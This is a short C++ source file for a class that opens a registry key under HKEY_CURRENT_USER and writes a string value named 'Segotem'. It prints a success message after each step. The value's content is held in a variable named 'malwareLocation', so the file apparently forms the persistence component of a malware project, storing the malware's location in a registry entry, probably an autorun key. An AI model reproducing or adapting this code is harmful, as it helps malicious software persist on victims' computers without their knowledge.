#include "RegOpenAndWrite.h"


void RegOpenAndWrite::RegOpenAndWriteTwo(LPCSTR _regpath, string regcontent) {

	LONG openReg = RegOpenKey(HKEY_CURRENT_USER, TEXT(_regpath), &_regHandleKey);

	if (openReg == ERROR_SUCCESS)
	{
		cout << "opening registry entry was successful";
	}

	std::string malwareLocation = regcontent;

	LONG setReg = RegSetValueExA(_regHandleKey, TEXT("Segotem"), 0, REG_SZ, (const BYTE*)malwareLocation.c_str(), malwareLocation.length() + 1);

	if (setReg == ERROR_SUCCESS)
	{
		cout << "saving content into registry was successful";
	}


	LONG closeRegistryEntry = RegCloseKey(_regHandleKey);

	if (closeRegistryEntry == ERROR_SUCCESS)
	{
		cout << "closing the registry entry was successful";
	}



}


RegOpenAndWrite::RegOpenAndWrite()
{
}


RegOpenAndWrite::~RegOpenAndWrite()
{
}
